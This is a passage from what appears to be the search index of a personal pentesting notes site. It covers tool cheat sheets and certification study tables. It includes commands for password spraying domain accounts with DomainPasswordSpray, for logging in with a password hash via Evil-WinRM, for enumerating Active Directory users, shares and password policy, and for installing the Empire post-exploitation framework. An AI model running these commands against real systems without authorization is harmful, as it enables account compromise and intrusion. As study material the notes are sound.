blocks.</p>","tags":["pentesting","dns","enumeration","tools"]},{"location":"dnsenum/#installation","title":"Installation","text":"<p>Download from the github repo: https://github.com/fwaeytens/dnsenum.</p>","tags":["pentesting","dns","enumeration","tools"]},{"location":"dnsenum/#basic-usage","title":"Basic usage","text":"<p>Used for active fingerprinting:</p> <pre><code>dnsenum domain.com\n</code></pre> <p>One cool thing about dnsenum is that it can perform dns transfer zone, like [dig]](dig.md). </p> <p>It performs DNS brute force with /usr/share/dnsenum/dns.txt.</p> <pre><code>dnsenum --enum example.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r\n# -f Indicate the wordlist file\n</code></pre>","tags":["pentesting","dns","enumeration","tools"]},{"location":"dnspy/","title":"DNSpy - A .NET decompiler for windows","text":"<p>Download it  from: https://github.com/dnSpy/dnSpy/releases</p> <p>You can use dnsSpy to determine if application is .NET executables or native code. If DNSpy decompiles the file .exe, then it means that\u2019s .NET executable. </p> <p>Finding a .NET decompiler for Linux</p> <p>There are well-known decompilers out there. For windows you have dnSpy and many more. In linux you have the open source ILSpy. BUT: Installation required some dependencies. There were more tools (wine).</p>","tags":["pentesting"]},{"location":"dnsrecon/","title":"DNSRecon","text":"<p>Preinstalled with Linux: dsnrecon is a simple python script that enables to gather  DNS-oriented  information on a given target.</p>","tags":["pentesting","dns","enumeration","tools"]},{"location":"dnsrecon/#basic-usage","title":"Basic usage","text":"<pre><code>dnsrecon -d example.com\n</code></pre>","tags":["pentesting","dns","enumeration","tools"]},{"location":"docker/","title":"docker","text":"","tags":["docker"]},{"location":"docker/#installation","title":"Installation","text":"<p>To make sure that I have docker engine, docker compose and nginx installed.</p> <pre><code>sudo apt install docker docker-compose nginx\n</code></pre> <p>Depending on the image you are going to compose you will need nginx or other dependencies. </p> <p>Another way, see https://www.kali.org/docs/containers/installing-docker-on-kali/</p> <pre><code>sudo apt update\nsudo apt install -y docker.io\nsudo systemctl enable docker --now\ndocker\nsudo usermod -aG docker $USER\n</code></pre>","tags":["docker"]},{"location":"docker/#basic-commands","title":"Basic commands","text":"<pre><code># show all processes \ndocker ps -a\n\n# Actions on dockerInstance/PID/part of id if unique: restart, stop, start, status\nsudo docker &lt;restart/stop/start/status&gt; &lt;nameOfDockerInstance/PID/partOfIDifUnique&gt;\n\n# Create the first docker instance: Hello, world! It gets the setting from docker.hub\nsudo docker run hello-world\n# run: build and deploy an instance\n# by default, docker saves everything in /var/lib/docker\n\n# Execute commands in an already running docker instance. You can execute a terminal or a command. \nsudo docker run -it &lt;image&gt; &lt;echo lala / bf bash&gt;\n# image: for instance, debian\n# &lt;echo lala or bf bash&gt;: command echo lala. Or terminal in bash\n</code></pre>","tags":["docker"]},{"location":"domainpasswordspray/","title":"DomainPasswordSpray","text":"<p>DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS!</p> <p>Repo: https://github.com/dafthack/DomainPasswordSpray</p>","tags":["windows","enumeration","active","directory"]},{"location":"domainpasswordspray/#installation","title":"Installation","text":"<pre><code># Open cmd \npowershell.exe -exec bypass\n\nImport-Module DomainPasswordSpray.ps1\n</code></pre>","tags":["windows","enumeration","active","directory"]},{"location":"domainpasswordspray/#basic-commands","title":"Basic commands","text":"<pre><code># Authenticated in the domain:\nInvoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue\n# If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.\n\n# Not authenticated in the domain:\nInvoke-DomainPasswordSpray -UserList userlist.txt -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue\n</code></pre>","tags":["windows","enumeration","active","directory"]},{"location":"dotpeek/","title":"dotPeek - A tool for decompiling","text":"<p>dotPeek is a tool by JetBrains.</p>"},{"location":"dotpeek/#installation","title":"Installation","text":"<p>Download from: https://www.jetbrains.com/es-es/decompiler/download/#section=web-installer</p> <p></p>"},{"location":"dread/","title":"Microsoft DREAD","text":"<p>Microsoft DREAD. <code>DREAD</code> is a risk assessment system developed by Microsoft to help IT security professionals evaluate the severity of security threats and vulnerabilities. It is used to perform a risk analysis by using a scale of 10 points to assess the severity of security threats and vulnerabilities. With this, we calculate the risk of a threat or vulnerability based on five main factors:</p> <ul> <li>Damage Potential</li> <li>Reproducibility</li> <li>Exploitability</li> <li>Affected Users</li> <li>Discoverability</li> </ul>","tags":["dread","cvss"]},{"location":"drozer/","title":"drozer - A security testing framework for Android","text":"<p>drozer (formerly Mercury) is the leading security testing framework for Android.</p> <p>drozer allows you to search for security vulnerabilities in apps and devices by assuming the role of an app and interacting with the Dalvik VM, other apps' IPC endpoints and the underlying OS.</p> <p>drozer provides tools to help you use, share and understand public Android exploits. It helps you to deploy a drozer Agent to a device through exploitation or social engineering.</p>","tags":["mobile pentesting"]},{"location":"drozer/#installation","title":"Installation","text":"<p>Instructions from: https://github.com/WithSecureLabs/drozer</p> <p>Also, you can download it from: https://github.com/FSecureLABS/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk</p> <pre><code>adb install drozer-agent-2.3.4.apk\npip install twisted\n</code></pre> <p>Prerequisites: JDK 1.6, python2.7, Android SDK, adb, java 1.6.</p> <p>Note: Java 1.6 is mandatory since Android bytecode is only compliant to version 1.6 and no higher.</p> <ol> <li>Install genymotion and get a device, for instance a samsung galaxy S6, running in the virtualbox.</li> <li>Go to drozer app ant turn on servers. You will get a message on the app saying that port 31415 is now on.</li> <li>From the terminal, we redirect the port with: <pre><code>adb connect IPDevice:PORT\nadb forward tcp:31415 tcp:31415\n</code></pre></li> <li>No we connect to drozer console: <pre><code>drozer console connect\n</code></pre></li> </ol> <p>For this to work, we need to have: </p> <ul> <li>device set on Host-Only + Nat mode.</li> <li>Kali set on Host-Only + Nat mode.</li> </ul> <p>Also, connections need to be running on the same interfaces (ethn).</p>","tags":["mobile pentesting"]},{"location":"drozer/#basic-commands","title":"Basic commands","text":"<p>These commands run on a drozer terminal:</p> <pre><code># Display the apps installed on the device.\nrun app.package.list\n\n# Display only the apps with identifier lala\nrun app.package.list -f lala\n\n# Log debug information\nlog.d\n\n# Log system information\nlog.i\n\n# Log error information\nlog.e\n</code></pre>","tags":["mobile pentesting"]},{"location":"drozer/#basic-commands-on-packages","title":"Basic commands on packages","text":"<pre><code># Display available commands.\nrun + TAB\n\n# Show the manifest of a given app.\nrun app.package.manifest nameOfApp\n\n# Show generic information about the app\nrun app.package.info -a nameOfApp\n\n# Display surface, a resume of activities, component providers, services, exported activities and if it is debugable.\nrun app.package.attacksurface nameOfApp\n</code></pre>","tags":["mobile pentesting"]},{"location":"drozer/#basic-commands-on-activities","title":"Basic commands on activities","text":"<pre><code># Show generic information about the activities\nrun app.activity.info -a nameOfApp\n\n# Display an activity on a device\nrun app.activity.start --component nameOfApp nameOfApp.nameOfActivity\n</code></pre>","tags":["mobile pentesting"]},{"location":"drozer/#basic-commands-on-providers","title":"Basic commands on providers","text":"<pre><code># Display existing providers.\nrun app.provider.info -a nameOfApp\n\n# Display the location of providers. It uses content:// protocol\nrun app.providers.finduri nameOfApp\n\n# Display the database information of the provider.\nrun app.provider.query uriOfProvider\n</code></pre>","tags":["mobile pentesting"]},{"location":"drozer/#basic-commands-on-scanners","title":"Basic commands on scanners","text":"<pre><code># To see all tests and scans you can run with drozer on your app.\nrun scanner. +TAB\n\n# Test the app to see if it is vulnerable to an injection.\nrun scanner.provider.injection -a nameOfApp\n\n# Check out if the App is vulnerable to a traversal attack\nrun scanner.provider.traversal -a nameOfApp\n</code></pre>","tags":["mobile pentesting"]},{"location":"dsquery/","title":"Dsquery","text":"<p>Dsquery\u00a0is a helpful command-line tool that can be utilized to find Active Directory objects. </p> <p><code>dsquery</code>\u00a0will exist on any host with the\u00a0<code>Active Directory Domain Services Role</code>\u00a0installed, and the\u00a0<code>dsquery</code>\u00a0DLL exists on all modern Windows systems by default now and can be found at\u00a0<code>C:\\Windows\\System32\\dsquery.dll</code>.</p> <p>All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a\u00a0<code>SYSTEM</code>\u00a0context.</p>","tags":["tools","powershell","dsquery"]},{"location":"dsquery/#basic-commands","title":"Basic commands","text":"<pre><code># User Search\ndsquery user\n\n# Computer Search\ndsquery computer\n\n# List objects in an OU\ndsquery * \"CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\n#  List Users With Specific Attributes Set (PASSWD_NOTREQD) by Combining dsquery with LDAP search filters of our choosing. The below looks for users with the PASSWD_NOTREQD flag set in the userAccountControl attribute.\ndsquery * -filter \"(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))\" -attr distinguishedName userAccountControl\n\n# Searching for Domain Controllers\n dsquery * -filter \"(userAccountControl:1.2.840.113556.1.4.803:=8192)\" -limit 5 -attr sAMAccountName\n# userAccountControl:1.2.840.113556.1.4.803: Specifies that we are looking at the User Account Control (UAC) attributes for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as Object Identifiers (OIDs).\n# =8192 represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like password is not required or account is locked is set. \n</code></pre> <p><code>userAccountControl:1.2.840.113556.1.4.803:</code>\u00a0Specifies that we are looking at the\u00a0User Account Control (UAC) attributes\u00a0for an object.</p> <ul> <li><code>userAccountControl:1.2.840.113556.1.4.803:</code>\u00a0Specifies that we are looking at the\u00a0User Account Control (UAC) attributes\u00a0for an object.</li> <li> <p><code>=8192</code>\u00a0represents the decimal bitmask we want to match in this search.  OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:</p> </li> <li> <p><code>1.2.840.113556.1.4.803</code> When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.</p> </li> <li> <p><code>1.2.840.113556.1.4.804</code> When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.</p> </li> <li> <p><code>1.2.840.113556.1.4.1941</code> This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.</p> </li> </ul>","tags":["tools","powershell","dsquery"]},{"location":"echo-mirage/","title":"Echo Mirage","text":"","tags":["windows","thick applications","traffic tool"]},{"location":"echo-mirage/#installation","title":"Installation","text":"<p>Download from </p> <p>Google Drive:</p> <p>https://drive.google.com/open?id=1JE70HH-CNd_VIl190sheL72w3P5dYK58</p> <p>Mega.nz:</p> <p>https://mega.nz/#!lRtUzApC!2hBLDnNiOZJ87Z9kmgFfwDLDvWZUBixGpZrTVtuYHSI</p>","tags":["windows","thick applications","traffic tool"]},{"location":"ejpt/","title":"eJPT - eLearnSecurity Junior Penetration Tester Cheat Sheet","text":"<p>What is eJPT? The eJPT is\u00a0a 100% hands-on certification for penetration testing and essential information security skills. </p> <p>I'm more than happy to share my personal cheat sheet of the #eJPT Preparation exam.</p>","tags":["pentesting"]},{"location":"ejpt/#subdomain-enumeration","title":"Subdomain enumeration","text":"Tool + Cheat sheet What it does Google dorks Google hacking, also named Google dorking, is a hacker technique that uses Google Search and other Google applications to find security holes in the configuration and computer code that websites are using. Sublist3r Sublist3r enumerates subdomains using many search engines such as Google, Yahoo, Bing, Baidu and Ask. Sublist3r also enumerates subdomains using Netcraft, Virustotal, ThreatCrowd, DNSdumpster and ReverseDNS. crt.sh It collects information about SSL certificates. If you visit a domain and it contains a certificate you can extract other subdomain by using the View Certificate functionality. dnscan Python wordlist-based DNS subdomain scanner. amass In depth DNS Enumeration and network mapping.","tags":["pentesting"]},{"location":"ejpt/#footprinting-scanning","title":"Footprinting &amp; Scanning","text":"Tool + Cheat sheet What it does ping ping works by sending one or more special ICMP packets (Type 8 - echo request) to a host. If the destination host replies with ICMP echo reply packets, then the host is alive. fping Linux tool which is an improved version of the ping utility. nmap Network Mapper is an open source tool for network exploration and security auditing. Free and open-source scanner created by Gordon Lyon. Nmap is used to discover hosts and services on a computer network by sending packages and analyzing the responses. p0f P0f is a tool that utilizes an array of sophisticated, purely passive traffic fingerprinting mechanisms to identify the players behind any incidental TCP/IP communications (often as little as a single normal SYN) without interfering in any way. masscan Masscan was designed to deal with large networks and to scan thousands of Ip addresses at once. It\u2019s faster than nmap but probably less accurate.","tags":["pentesting"]},{"location":"ejpt/#enumeration-tools","title":"Enumeration tools","text":"Tool + Cheat sheet URL dirb DIRB is a web content fingerprinting tool. It scans the web server for directories using a dictionary file feroxbuster FEROXBUSTER is a web content fingerprintinf tool that uses brute force combined with a wordlist to search for unlinked content in target directories. httprint HTTPRINT is a web server fingerprinting tool. It identifies web servers and detects web enabled devices which do not have a server banner string, such as wireless access points, routers, switches, cable modems, etc. wpscan WPSCAN is a wordpress security scanner.","tags":["pentesting"]},{"location":"ejpt/#dictionaries","title":"Dictionaries","text":"<p>List of dictionaries.</p> Tool + Cheat sheet What it does crunch Generate combinations of words and manglings to be used later off as attacking dictionaries.","tags":["pentesting"]},{"location":"ejpt/#vulnerability-assessment-scanners","title":"Vulnerability assessment: scanners","text":"Available scanners + Cheat sheet URL Nessus https://www.tenable.com/downloads/nessus OpenVAS https://www.openvas.org/ Nexpose https://www.rapid7.com/products/nexpose/ GFOLAnGuard https://www.gfi.com/products-and-solutions/network-security-solutions/gfi-languard","tags":["pentesting"]},{"location":"ejpt/#toolstecniques-for-network-exploitation","title":"Tools/tecniques for network exploitation","text":"Tool + Cheat sheet What it does netcat netcat (often abbreviated to nc) is a computer networking utility for reading from and writing to network connections using TCP or UDP. openSSL OpenSSL is a software library for applications that provide secure communications over computer networks against eavesdropping or need to identify the party at the other end. It is widely used by Internet servers, including the majority of HTTPS websites. Registry creation Registries in the victim machine may be used to save a connection to the attacker machine.","tags":["pentesting"]},{"location":"ejpt/#web-pentesting","title":"Web pentesting","text":"Vulnerability / Technique What it does Tool Backdoors with netcat Buffer Overflow attacks A buffer is an area in the RAM (Random Access Memory) reserved for temporary data storage. If a developer does not enforce buffer\u2019s limits, an attacker could find a way to write data beyond those limits. Remote Code Execution RCE\u00a0attacks involve attackers manipulating network traffic by exploiting code vulnerabilities to access a corporate system. XSS attack - Cross-site Scripting attack Cross-Site Scripting attacks or XSS attacks enable attackers to inject client-side scripts into web pages. This is done through an URL than the attacker sends. Crafted in the URL, this js payload is injected. xsser SQL injection SQL stands for Structure Query Language. SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. sqlmap","tags":["pentesting"]},{"location":"ejpt/#password-cracker","title":"Password cracker","text":"Tool + Cheat sheet What it does ophcrack Ophcrack is a free Windows password cracker based on rainbow tables. It is a efficient implementation of rainbow tables. It comes with a Graphical User Interface and runs on multiple platforms. hashcat Hashcat is a password recovery tool. It had a proprietary code base until 2015, but was then released as open source software. Versions are available for Linux, OS X, and Windows. wikipedia. John the Ripper John the Ripper is one of those tools that can be used for several things: hash cracker and dictionary attack. hydra Hydra can attack nearly 50 services including: Cisco auth, FTP, HTTP, IMAP, RDP, SMB, SSH, Telnet... It uses modules for each protocol.","tags":["pentesting"]},{"location":"ejpt/#dictionary-attacks","title":"Dictionary attacks","text":"Tool + Cheat sheet What it does John the Ripper John the Ripper is one of those tools that can be used for several things: hash cracker and dictionary attack. hydra Hydra can attack nearly 50 services including: Cisco auth, FTP, HTTP, IMAP, RDP, SMB, SSH, Telnet... It uses modules for each protocol.","tags":["pentesting"]},{"location":"ejpt/#windows","title":"Windows","text":"<p>Introduction about NetBIOS.</p> Vulnerability / Technique What it does Tools Null session attack This attack exploits an authentification vulnerability for Windows Administrative Shares. Manual attack, Winfo, enum, enum4linux, samrdump.py, nmap script Arp poisoning This attack is performed by sending gratuitous ARP replies. arpspoof Remote Code Execution RCE\u00a0attacks involve attackers manipulating network traffic by exploiting code vulnerabilities to access a corporate system. Burpsuite and Wireshark","tags":["pentesting"]},{"location":"ejpt/#linux","title":"Linux","text":"<p>Spawn a shell. msfvenom.</p>","tags":["pentesting"]},{"location":"ejpt/#lateral-movements","title":"Lateral movements","text":"<p>Lateral movements</p>","tags":["pentesting"]},{"location":"emacs/","title":"emacs - A text editor... and more","text":""},{"location":"emacs/#syntax","title":"Syntax","text":"<p>Before starting, it is convenient to consider the syntax we'll be using:</p> <pre><code>C-&lt;char&gt; \nWe'll keep press CTRL key and at the same time a character.\n\nM-&lt;char&gt;\nWe'll keep press ALT key and at the same time a character.\n\nESC &lt;char&gt;\nWe'll press ESC key, and after that we'll press the character.\n\nC &lt;char&gt;\nWe'll press CTRL key, and after that we'll press the character.\n\nM &lt;char&gt;\nWe'll press ALT key, and after that we'll press the character.\n</code></pre>"},{"location":"emacs/#basic-commands","title":"Basic commands","text":"<p>Disclaimer: when creating this cheat sheet, I've realized that I'm totally in love with emacs, meaning this article is full of bias comments. Neutrality is overrated.</p>"},{"location":"emacs/#session-and-process-management","title":"Session and process management","text":"<pre><code> # Close session. It will ask if you want to save the buffers.\nC-x C-c\n\n# Cancel a running process.\nC-g\n\n# Remove all open windows and expand the windows that contains the active cursor position \nC-x 1\n</code></pre>"},{"location":"emacs/#cursor-movement","title":"Cursor Movement","text":"<p>A difference with vim or neovim editor, \"cursor mode\" and \"insert mode\" go together in emacs, meaning you will be able to insert any character from whenever the cursor is without having to switch from one mode to another. </p> <p>There is also a small but big difference. Emacs includes a blank character at the end of the line. This alone can sound very vague, but it allows you to move in a more natural and human way from the beginning of one line to the end of the previous one. Just this silly feature makes me love more emacs than vim (#sorryVimDudes). </p> <pre><code># Go to previous line.\nC-p\n\n# Go to next line.\nC-n\n\n# Move cursor position one character forwards.\nC-f\n\n# Move cursos position one character backwards.\nC-b\n\n# Go to the beginning of the line.\nC-a\n\n# Go to the end of the line.\nC-e\n\n# Go to the beginning of the sentence.\nM-a\n\n# Go to the end of the sentence.\nM-e\n\n# Go to the beginning of the file.\nM-&lt;\n\n# Go to the end of the file.\nM-&gt;\n</code></pre>"},{"location":"emacs/#deleting","title":"Deleting","text":"<pre><code># Remove following word\nM-d\n\n# Remove previous word\nM-DEL\n\n# Remove from the cursor position to the end of the line\nC-k\n\n# Remove from the cursor position to the end of the sentence\nM-k\n\n# Select from here to the position where you've moved the cursor. \nC-Space\nDEL\n</code></pre>"},{"location":"emacs/#clipboard","title":"Clipboard","text":"<p>Another cool functionality in emacs is that clipboard has history. If having a blank character at the end of the line wasn't not enough for just falling in love with emacs, now you cannot make excuses. The ability to navigate through the history of yanked code turns emacs into exactly what you have dreaming with.</p> <pre><code># Browse the clipboard to older yanked text. \nM-y\n</code></pre>"},{"location":"emacs/#undo","title":"Undo","text":"<pre><code># Three ways to undo an action text related (non cursor position related).\nC-/\nC-_\nC-x u\n</code></pre>"},{"location":"emacs/#buffers","title":"Buffers","text":"<p>Also, browsing your buffers in emacs is insanely easy. One more reason to love emacs.</p> <p>The emacs autosaved file has this syntax:</p> <pre><code>#nameOfAutosavedFile;\n</code></pre> <pre><code># List your buffers.\nC-b\n\n# Get rid of the list with all buffers.\nC-x 1\n\n# Go to an specific buffer (normally all of them are wrapped up between * *).\nC-x b &lt;nameOfBuffer&gt;\n\n# Enter in a minibuffer\nM-x\n\n# Get out of a minibuffer (in this case C-g doesn't work).\nESC ESC ESC\n</code></pre>"},{"location":"emacs/#file-management","title":"File management","text":"<pre><code># Save in bulk. It will ask if you want to save your buffers one by one.\nC-x s\n\n# To recover a file:\n# Open the non saved file with\nemacs nameOfNonSavedFile\u00e7\nM-x recover-file RETURN\nYes ENTER\n</code></pre>"},{"location":"emacs/#modes","title":"Modes","text":"<pre><code># Change to fundamental mode.\nM-x fundamental-mode\n\n# Change to text mode.\nM-x text-mode\n\n# Activate or deactivate autofill mode.\nM-x auto-fill-mode RETURN\n</code></pre>"},{"location":"emacs/#search","title":"Search","text":"<pre><code># Search for an expression forwards.\nC-s\n\n# Search for an expression backwards.\nC-r\n</code></pre>"},{"location":"emacs/#windows-management","title":"Windows management","text":"<p>Only a few things can compete with the beauty of i3 windows manager, and in my opinion emacs is not as neat and direct as i3, but still, emacs is not exactly a windows management tool but it manages its windows in a quite easy way:</p> <pre><code># Divide vertically current window in two.\nC-x 2\n\n# Divide horizontally current window in two.\nC-x 3\n\n# Move cursor position to the other window.\nC-x o\n\n# Open a file in a different window below.\nC-x 4 C-f nameOfFile\n\n# Create a new and independent window.\nM-x make-frame\n\n# Remove/close the window.\nM-x delete-frame\n</code></pre>"},{"location":"emacs/#help","title":"Help","text":"<pre><code># Show documentation about a command.\nC-h k command\n\n# Describe a command.\nC-h x command\n\n# Open available manuals.\nC-h i\n</code></pre>"},{"location":"empire/","title":"Empire","text":"<p>Empire is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent.</p> <p>Basically, you can run powershell agents without having to run powershell.</p>","tags":["post exploitation"]},{"location":"empire/#installation","title":"Installation","text":"<pre><code>git clone https://github.com/EmpireProject/Empire.git\nEmpire/setup/install.sh\n</code></pre>","tags":["post exploitation"]},{"location":"empire/#usage","title":"Usage","text":"","tags":["post exploitation"]},{"location":"enum/","title":"enum","text":"<p>Enum is a console-based Win32 information enumeration utility. Using null sessions, enum can retrieve userlists, machine lists, sharelists, namelists, group and member lists, password and LSA policy information. enum is also capable of a rudimentary brute force dictionary attack on individual accounts.\u00a0 inux-ng -P 172.16.5.5 -oA ilfreight</p>","tags":["windows","enumeration"]},{"location":"enum/#installation","title":"Installation","text":"<p>Download it from: https://packetstormsecurity.com/search/?q=win32+enum&amp;s=files.</p>","tags":["windows","enumeration"]},{"location":"enum/#basic-commands","title":"Basic commands","text":"<pre><code># Enumerates shares\nenum.exe -s $ip \u00a0 \u00a0 \n\n# Enumerates users\nenum.exe -u $ip\n\n# Displays the password policy in case you need to mount a network authentification attack\nenum.exe -p $ip \n</code></pre>","tags":["windows","enumeration"]},{"location":"enum4linux/","title":"enum4linux","text":"<p>enum4linux is used to exploit null session attacks by using this PERL script. The\u00a0original tool\u00a0was written in Perl and\u00a0rewritten by Mark Lowe in Python. Essentially it does something similar to  winfo and enum.</p>","tags":["windows","enumeration"]},{"location":"enum4linux/#installation","title":"Installation","text":"<p>Preinstalled in kali. </p>","tags":["windows","enumeration"]},{"location":"enum4linux/#basic-commands","title":"Basic commands","text":"<pre><code># Enumerate shares\nenum4linux.exe -S $ip\n\n# Enumerate users\nenum4linux.exe -U $ip \u00a0 \n# enum4linux -U $ip  | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"]\"\n\n# Enumerate machine list\nenum4linux.exe -M $ip\n\n# Display the password policy in case you need to mount a network authentification attack\nenum4linux.exe -enuP $ip\n\n# Specify username to use (default \u201c\u201d)\nenum4linux.exe -u $ip\n\n# Specify password to use (default \u201c\u201d)\nenum4linux.exe -p $ip \u00a0 \u00a0 \n\n# Also you can use brute force by adding a file\nenum4linux.exe -s /usr/share/enum4linux/share-list.txt $ip \u00a0\n\n# Do a nmblookup (similar to nbtstat)\nenum4linux.exe -n $ip \u00a0\n# In the result we see the &lt;20&gt; flag which means there are resources shared\n\n# Enumerates the password policy in the remote system. This is useful to use brute force\nenum4linux.exe -P $ip\n\n# Enumerates available shares\nenum4linux.exe -s $ip     \n</code></pre> <p>If you want to run all these commands in one line:</p> <pre><code>enum4linux.exe -a $ip\n</code></pre>","tags":["windows","enumeration"]},{"location":"enum4linux/#enum4linux-ng","title":"enum4linux-ng","text":"<p>The tool\u00a0enum4linux-ng\u00a0is a rewrite of\u00a0<code>enum4linux</code>\u00a0in Python, but has additional features such as the ability to export data as YAML or JSON files which can later be used to process the data further or feed it to other tools. It also supports colored output, among other features.</p> <p>For other hosts: install python tool from \u00a0enum4linux-ng </p> <pre><code>https://github.com/cddmp/enum4linux-ng\ncd enum4linux\n\n# Basic use:\nenum4linux-ng.py -P &lt;target&gt; -oA ilfreight\n# Enum4linux-ng provided us with a bit clearer output and handy JSON and YAML output using the -oA flag.\ncat ilfreight.json \n</code></pre>","tags":["windows","enumeration"]},{"location":"evil-winrm/","title":"Evil-WinRm","text":"<p>Evil-WinRM connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target.</p> <p>By default, installed on kali. See winrm.</p>","tags":["tools","active directory","windows remote management"]},{"location":"evil-winrm/#basic-usage","title":"Basic usage","text":"<p>Example from HTB machine: Responder.</p> <pre><code>evil-winrm -i $ip -u &lt;username -p &lt;password&gt;\n\nevil-winrm -i &lt;ip&gt; -u Administrator -H \"&lt;passwordhash&gt;\"\n# -H: Hash\n</code></pre>","tags":["tools","active directory","windows remote management"]},{"location":"ewpt-preparation/","title":"eWPT Preparation","text":"Module Course (name and link) My notes on HackingLife 01 Introduction to Web application testing -HTTP and HTTPs- Phases of a web application security testing 02 Web Enumeration &amp; Information Gathering Information gathering 03 WAPT: Web proxies and Web Information Gathering - BurpSuite- OWASP Zap 04 XSS Attacks - Cross Site Script vulnerabilities.- XSSer 05 SQL Injection Attacks - SQL injection: mysql,  mssql,  postgreSQL,  mariadb,  oracle database - NoSQL injection: sqlite, mongodb, redis - SQLi Cheat sheet for manual injection - Burpsuite Labs 06 Testing for common attacks - Testing HTTP Methods- Attacking basic and digest authentication, and OTP- Session management- Session fixation- Session highjacking- CSRF- Command injections- RCE attack - Remote Code Execution 07 File and Resource attacks - Arbitrary File Upload- Directory Traversal attack- Local File Inclusion (LFI)- Remote File Inclusion (RFI) 08 Web Service Security testing - Web services 09 CMS Security testing - Pentesting wordpress 10 Encoding, Filtering &amp; Evasion - Data encoding- Input filtering <p>eWPTX</p> Module Course name My notes on HackingLife 01 Encoding and filtering - Data encoding- Input filtering 02 Evasion Basics 03 Cross-Site Scripting - Cross Site Script vulnerabilities. 04 Filter evasion and WAF Bypasssing 05 Cross-Site Request Forgery 06 HTML 5 07 SQL Injection 08 SQLi - Filter Evasion and WAF Bypassing 09 XML Attacks 10 Attacking Serialization 11 Server Side Attacks 12 Attacking Crypto 13 Attacking Authentication &amp; SSO 14 Pentesting APIs &amp; Cloud Applications 15 Attacking LDAP-based Implementations","tags":["course","certification","web pentesting"]},{"location":"exiftool/","title":"exiftool - A tool for metadata edition","text":"<p>ExifTool is a platform-independent Perl library plus a command-line application for reading, writing and editing meta information in a wide variety of files. ExifTool supports many different metadata formats including EXIF, GPS, IPTC, XMP, JFIF, GeoTIFF, ICC Profile, Photoshop IRB, FlashPix, AFCP and ID3, Lyrics3, as well as the maker notes of many digital cameras by Canon, Casio, DJI, FLIR, FujiFilm, GE, GoPro, HP, JVC/Victor, Kodak, Leaf, Minolta/Konica-Minolta, Motorola, Nikon, Nintendo, Olympus/Epson, Panasonic/Leica, Pentax/Asahi, Phase One, Reconyx, Ricoh, Samsung, Sanyo, Sigma/Foveon and Sony.</p> <p>ExifTool can\u00a0Read,\u00a0Write and/or\u00a0Create files in the following formats. Also listed are the support levels for EXIF, IPTC (IIM), XMP, ICC_Profile, C2PA (JUMBF) and other metadata types for each file format. C2PA metadata is not currently\u00a0Writable, but may be\u00a0Deleted from some file types by deleting the JUMBF group (ie.\u00a0<code>-JUMBF:all=</code>).</p>","tags":["pentesting","file"]},{"location":"exiftool/#installation","title":"Installation","text":"<p>Download from https://exiftool.org/index.html.</p>","tags":["pentesting","file"]},{"location":"exiftool/#basic-usage","title":"Basic usage","text":"<pre><code># Print common meta information for all images in \"dir\".  \"-common\" is a shortcut tag representing common EXIF meta information.\nexiftool -common dir\n\n# List specified meta information in tab-delimited column form for all images in \"dir\" to an output text file named \"out.txt\".\nexiftool -T -createdate -aperture -shutterspeed -iso dir &gt; out.txt\n\n# Print ImageSize and ExposureTime tag names and values.\nexiftool -s -ImageSize -ExposureTime b.jpg\n\n\n# Print standard Canon information from two image files.\nexiftool -l -canon c.jpg d.jpg\n\n# Recursively extract common meta information from files in \"pictures\" directory, writing text output to \".txt\" files with the same names.\nexiftool -r -w .txt -common pictures\n\n# Save thumbnail image from \"image.jpg\" to a file called \"thumbnail.jpg\".\nexiftool -b -ThumbnailImage image.jpg &gt; thumbnail.jpg\n\n# Recursively extract JPG image from all Nikon NEF files in the current directory, adding \"_JFR.JPG\" for the name of the output JPG files.\nexiftool -b -JpgFromRaw -w _JFR.JPG -ext NEF -r .\n\n# Extract all types of preview images (ThumbnailImage, PreviewImage, JpgFromRaw, etc.) from files in directory \"dir\", adding the tag name to the output preview image file names.\nexiftool -a -b -W %d%f_%t%-c.%s -preview:all dir\n\n# Print formatted date/time for all JPG files in the current directory.\nexiftool -d '%r %a, %B %e, %Y' -DateTimeOriginal -S -s -ext jpg \n\n# Extract image resolution from EXIF IFD1 information (thumbnail image IFD)\nexiftool -IFD1:XResolution -IFD1:YResolution image.jpg\n\n# Extract all tags with names containing the word \"Resolution\" from an image.\nexiftool '-*resolution*' image.jpg\n\n# Extract all author-related XMP information from an image.\nexiftool -xmp:author:all -a image.jpg\n\n# Extract complete XMP data record intact from \"a.jpg\" and write it to \"out.xmp\" using the special \"XMP\" tag (see the Extra tags in Image::ExifTool::TagNames).\nexiftool -xmp -b a.jpg &gt; out.xmp\n</code></pre>","tags":["pentesting","file"]},{"location":"exiftool/#tag-names","title":"Tag names","text":"<p>See table with all tag names: https://exiftool.org/TagNames/.</p> <p>A\u00a0Tag Name\u00a0is the handle by which the information is accessed in ExifTool.  Tag names are entered on the command line with a leading '<code>-</code>', in the order you want them displayed. Valid characters in a tag name are A-Z (case is not significant), 0-9, hyphen (-) and underline (_). The tag name may be prefixed by a\u00a0group name\u00a0(separated by a colon) to identify a specific information type or location. A special tag name of \"<code>All</code>\" may be used to represent all tags, or all tags in a specified group. For 